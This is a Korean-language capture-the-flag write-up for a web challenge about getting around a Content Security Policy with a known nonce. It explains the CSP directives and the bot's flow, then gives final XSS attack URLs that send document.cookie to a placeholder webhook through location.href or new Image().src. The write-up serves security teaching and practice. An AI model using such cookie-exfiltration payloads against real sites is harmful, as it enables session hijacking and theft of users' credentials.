CSP(Content Security Policy): 콘텐츠 보안 정책으로 웹 보안 설정 중 하나임

문제 사이트의 그림을 좀 살펴보면 상단의 입력창에는 CSP 규칙이 작성되어 있음

![alt text](image.png)


- default-src 'self': 기본적으로 현재 사이트와 같은 출처의 리소스만 허용함
- base-uri 'none': <base> 태그 사용금 금지함
- img-src *: 이미지는 모든 출처에서 가져올 수 있음. (여기가 조금 취약할듯)
- script-src 'nonce-rAndOm123': <script>를 사용하려면 특정 암호값(nonce)을 가진 스크립트만 실행 가능함 -> nonce값만 알면 <script>를 사용할 수 있을듯


해석하는 방법은 
정책에서 앞부분은 지시어, 뒤 부분은 허용범위를 뜻함
- default-src: 아래 항목들에 명시되지 않은 모든 리소스(기본, default)에 대한 기본 규칙
- script-src: 자바스크립트 실행 권한 제어
- style-src: CSS 스타일시트 적용 권한을 제어합니다.
- img-src: 이미지 로딩 권한을 제어합니다.
- base-uri: <base> 태그의 URL을 제한합니다.

허용범위
- 'self': 현재 페이지와 동일한 도메인(출처)만 허용합니다.
- 'none': 해당 리소스를 아예 허용하지 않습니다.
- * (와일드카드): 모든 외부 출처를 허용합니다.
- 'nonce-[값]': 서버가 생성한 특정 암호값(nonce)이 태그 내에 일치하게 들어있어야만 실행을 허용합니다.



문제 풀이 땅땅땅

문제 처음으로 가상서버를 열면 로그인창이 나오는데 사실상 메모, 로그인, user/admin 등의 계정은 의미가 없고 CSP 정책을 보고 NONCE 값을 알아내 FLAG값을 탈취하는 주 목적임

우선 FLAG를 app.py에서 검색을 해보면 debug() 에서 check_xss() 에 매개변수로 FLAG값을 딕셔너리 형태로 넘겨줌
따라가보면 "http://127.0.0.1:8000/memo?text={urllib.parse.quote(param)}" 형태로 URL 뒤에 param값을 /memo?text= 뒤에 debug/?param 값을 넣음, 이때 urllib.parse.quote() 를 통해서 URL 인코딩을함

read_url() 에서 넘겨받은 값을 가상 브라우저를 만들어서 인자로 받은 url값으로 접속하게됨 이때 같이 인자로 받은 쿠키를 가지고 브라우저로 접속하기 때문에 url이 csp 정책을 우회하기만 하면 cookie값(FLAG값)을 가져올 수 있음

CSP 정책에 img-src *; 라고 되어 있으니까 image의 src를 쓸 수도 있고, 그냥 script를 쓸 수도 있음



인코딩 전 최종 공격 URL (Image 사용 X)
http://host3.dreamhack.games:(포트 번호)/debug?param=<script nonce="(NONCE 값)">location.href="(웹훅 사이트 URL)"+document.cookie</script>


인코딩 전 최종 공격 URL (Image 사용 O)
http://host3.dreamhack.games:(포트 번호)/debug?param=<script nonce="(NONCE 값)">new Image().src="(웹훅 사이트 URL)"+document.cookie</script>


param 뒤의 데이터값 중에서 공백, <, >, + 은 데이터가 넘어가는 중에 손상될 수 있으니까 인코딩해줌
  ==> %20
< ==> %3C
> ==> %3E
+ ==> %2B
